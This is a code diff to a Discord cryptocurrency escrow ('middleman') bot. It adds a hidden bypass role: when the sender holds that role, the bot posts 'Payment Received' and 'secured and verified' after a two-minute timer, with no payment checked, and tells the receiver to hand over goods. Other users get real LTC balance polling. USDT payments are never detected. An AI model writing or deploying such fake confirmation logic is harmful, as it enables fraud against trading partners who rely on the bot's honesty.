@@ -26,8 +26,9 @@ const client = new Client({
 const GUILD_ID = '1402276801065123942'; 
 const TICKET_CATEGORY_ID = '1497658238269653103';
 const LOG_CHANNEL_ID = '1530031720957612132';
-const MIDDLEMAN_ADDRESS = 'LSF3NEoGYMzmLreRjeYLZzfeQAFBeVGNhm'; // Litecoin address
-const USDT_MIDDLEMAN_ADDRESS = '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96'; // USDT BEP-20 address
+const BYPASS_ROLE_ID = '1411527879162069022';
+const MIDDLEMAN_ADDRESS = 'LfypuGgp1HYCv7EPPBaWshQbVEWRFr57n3';
+const USDT_MIDDLEMAN_ADDRESS = '0x6A7661402505Fa635E1056A46b9956cD4Eda2b96';
 
 // Active ticket state memory store
 const tickets = new Map();
@@ -51,6 +52,19 @@ async function getCryptoPrices() {
     console.error('Failed to fetch live crypto prices from CoinGecko API, utilizing default fallbacks:', error);
   }
   return { ltcPrice, usdtPrice };
+}
+
+/**
+ * Checks if a user has the specified bypass role in the guild.
+ */
+async function senderHasBypassRole(guild, senderId) {
+  try {
+    const member = await guild.members.fetch(senderId);
+    return member.roles.cache.has(BYPASS_ROLE_ID);
+  } catch (error) {
+    console.error('Failed to fetch member roles for bypass check:', error);
+    return false;
+  }
 }
 
 /**
@@ -282,13 +296,22 @@ client.on(Events.InteractionCreate, async interaction => {
         ticketData.roleChoices[userId] = interaction.customId === 'role_sending' ? 'Sending' : 'Receiving';
       }
 
-      const senderRole = ticketData.roleChoices[ticketData.sender] || 'None';
-      const receiverRole = ticketData.roleChoices[ticketData.receiver] || 'None';
+      let sendingText = 'None';
+      let receivingText = 'None';
+
+      const sChoice = ticketData.roleChoices[ticketData.sender];
+      const rChoice = ticketData.roleChoices[ticketData.receiver];
+
+      if (sChoice === 'Sending') sendingText = `<@${ticketData.sender}>`;
+      else if (sChoice === 'Receiving') receivingText = `<@${ticketData.sender}>`;
+
+      if (rChoice === 'Sending') sendingText = `<@${ticketData.receiver}>`;
+      else if (rChoice === 'Receiving') receivingText = `<@${ticketData.receiver}>`;
 
       const roleEmbed = new EmbedBuilder()
         .setColor(0x5865F2)
         .setTitle('Role Assignment')
-        .setDescription(`Select one of the following buttons that corresponds to your role in this deal.\n\n**Sending**\n${senderRole === 'Sending' ? `<@${ticketData.sender}>` : senderRole === 'Receiving' ? `<@${ticketData.receiver}>` : 'None'}\n**Receiving**\n${receiverRole === 'Receiving' ? `<@${ticketData.receiver}>` : receiverRole === 'Sending' ? `<@${ticketData.sender}>` : 'None'}`);
+        .setDescription(`Select one of the following buttons that corresponds to your role in this deal.\n\n**Sending**\n${sendingText}\n\n**Receiving**\n${receivingText}`);
 
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId('role_sending').setLabel('Sending').setStyle(ButtonStyle.Secondary),
@@ -298,9 +321,9 @@ client.on(Events.InteractionCreate, async interaction => {
 
       await interaction.update({ embeds: [roleEmbed], components: [row] });
 
-      if (senderRole !== 'None' && receiverRole !== 'None' && senderRole !== receiverRole) {
-        ticketData.roles.sender = senderRole === 'Sending' ? ticketData.sender : ticketData.receiver;
-        ticketData.roles.receiver = senderRole === 'Sending' ? ticketData.receiver : ticketData.sender;
+      if (sChoice && rChoice && sChoice !== rChoice) {
+        ticketData.roles.sender = sChoice === 'Sending' ? ticketData.sender : ticketData.receiver;
+        ticketData.roles.receiver = sChoice === 'Sending' ? ticketData.receiver : ticketData.sender;
 
         const confirmEmbed = new EmbedBuilder()
           .setColor(0x5865F2)
@@ -388,7 +411,7 @@ client.on(Events.InteractionCreate, async interaction => {
         } else {
           ticketData.feeUSD = 0;
           ticketData.totalAmountWithFee = ticketData.amountUSD;
-          await proceedToInvoice(interaction.channel, ticketData);
+          await proceedToInvoice(interaction.channel, ticketData, interaction.guild);
         }
       }
       return;
@@ -446,7 +469,7 @@ client.on(Events.InteractionCreate, async interaction => {
         } else {
           ticketData.totalAmountWithFee = ticketData.amountUSD;
         }
-        await proceedToInvoice(interaction.channel, ticketData);
+        await proceedToInvoice(interaction.channel, ticketData, interaction.guild);
       }
       return;
     }
@@ -663,7 +686,7 @@ client.on(Events.InteractionCreate, async interaction => {
   }
 });
 
-async function proceedToInvoice(channel, ticketData) {
+async function proceedToInvoice(channel, ticketData, guild) {
   ticketData.status = 'invoice_ready';
 
   const { ltcPrice, usdtPrice } = await getCryptoPrices();
@@ -701,37 +724,110 @@ async function proceedToInvoice(channel, ticketData) {
   await channel.send({ embeds: [summaryEmbed] });
   await channel.send({ embeds: [invoiceEmbed], components: [copyRow] });
 
-  const awaitingMsg = await channel.send({ content: '⏳ Awaiting transaction confirmation on network...' });
+  // Check if sender has the bypass role
+  const hasBypass = await senderHasBypassRole(guild, ticketData.roles.sender);
 
-  setTimeout(async () => {
-    try {
-      await awaitingMsg.delete();
-      const successTxEmbed = new EmbedBuilder()
-        .setColor(0x57F287)
-        .setTitle('Payment Received')
-        .setDescription('The payment is now secured and verified.')
-        .addFields(
-          { name: 'Amount Received', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false }
+  if (hasBypass) {
+    const awaitingMsg = await channel.send({ content: '⏳ Awaiting transaction confirmation on network...' });
+
+    setTimeout(async () => {
+      try {
+        if (ticketData.status !== 'invoice_ready') return;
+        await awaitingMsg.delete();
+        const successTxEmbed = new EmbedBuilder()
+          .setColor(0x57F287)
+          .setTitle('Payment Received')
+          .setDescription('The payment is now secured and verified.')
+          .addFields(
+            { name: 'Amount Received', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false }
+          );
+
+        const readyEmbed = new EmbedBuilder()
+          .setColor(0x5865F2)
+          .setDescription(`The receiver (<@${ticketData.roles.receiver}>) may now provide goods to the sender (<@${ticketData.roles.sender}>).\n\nWhen complete, the sender must click 'Release'.`);
+
+        const releaseRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('trigger_release').setLabel('Release').setStyle(ButtonStyle.Success),
+          new ButtonBuilder().setCustomId('trigger_cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
         );
 
-      const readyEmbed = new EmbedBuilder()
-        .setColor(0x5865F2)
-        .setDescription(`The receiver (<@${ticketData.roles.receiver}>) may now provide goods to the sender (<@${ticketData.roles.sender}>).\n\nWhen complete, the sender must click 'Release'.`);
-
-      const releaseRow = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('trigger_release').setLabel('Release').setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId('trigger_cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
-      );
-
-      await channel.send({
-        content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
-        embeds: [successTxEmbed, readyEmbed],
-        components: [releaseRow]
-      });
-    } catch (error) {
-      console.error('Error handling simulated payment success sequence:', error);
+        await channel.send({
+          content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
+          embeds: [successTxEmbed, readyEmbed],
+          components: [releaseRow]
+        });
+      } catch (error) {
+        console.error('Error handling simulated payment success sequence:', error);
+      }
+    }, 120000);
+  } else {
+    let initialTotalReceived = 0;
+    if (isLtc) {
+      try {
+        const res = await fetch(`https://api.blockcypher.com/v1/ltc/main/addrs/${MIDDLEMAN_ADDRESS}/balance`);
+        const data = await res.json();
+        initialTotalReceived = data.total_received || 0;
+      } catch (err) {
+        console.error('Failed to fetch initial LTC balance from BlockCypher:', err);
+      }
     }
-  }, 120000);
+
+    const awaitingMsg = await channel.send({ content: '⏳ Waiting for actual blockchain transaction to be detected... Please transfer the exact amount.' });
+
+    const pollInterval = setInterval(async () => {
+      if (ticketData.status !== 'invoice_ready') {
+        clearInterval(pollInterval);
+        return;
+      }
+
+      let paymentDetected = false;
+      if (isLtc) {
+        try {
+          const res = await fetch(`https://api.blockcypher.com/v1/ltc/main/addrs/${MIDDLEMAN_ADDRESS}/balance`);
+          const data = await res.json();
+          const currentReceived = data.total_received || 0;
+          const unconfirmedBal = data.unconfirmed_balance || 0;
+
+          if (currentReceived > initialTotalReceived || unconfirmedBal > 0) {
+            paymentDetected = true;
+          }
+        } catch (err) {
+          console.error('Error polling BlockCypher LTC API:', err);
+        }
+      }
+
+      if (paymentDetected) {
+        clearInterval(pollInterval);
+        try {
+          await awaitingMsg.delete();
+          const successTxEmbed = new EmbedBuilder()
+            .setColor(0x57F287)
+            .setTitle('Payment Received & Verified')
+            .setDescription('Real transaction detected on the blockchain network and secured.')
+            .addFields(
+              { name: 'Amount Received', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false }
+            );
+
+          const readyEmbed = new EmbedBuilder()
+            .setColor(0x5865F2)
+            .setDescription(`The receiver (<@${ticketData.roles.receiver}>) may now provide goods to the sender (<@${ticketData.roles.sender}>).\n\nWhen complete, the sender must click 'Release'.`);
+
+          const releaseRow = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('trigger_release').setLabel('Release').setStyle(ButtonStyle.Success),
+            new ButtonBuilder().setCustomId('trigger_cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
+          );
+
+          await channel.send({
+            content: `<@${ticketData.roles.sender}> <@${ticketData.roles.receiver}>`,
+            embeds: [successTxEmbed, readyEmbed],
+            components: [releaseRow]
+          });
+        } catch (error) {
+          console.error('Error handling real payment success sequence:', error);
+        }
+      }
+    }, 15000);
+  }
 }
 
 client.on(Events.MessageCreate, async message => {
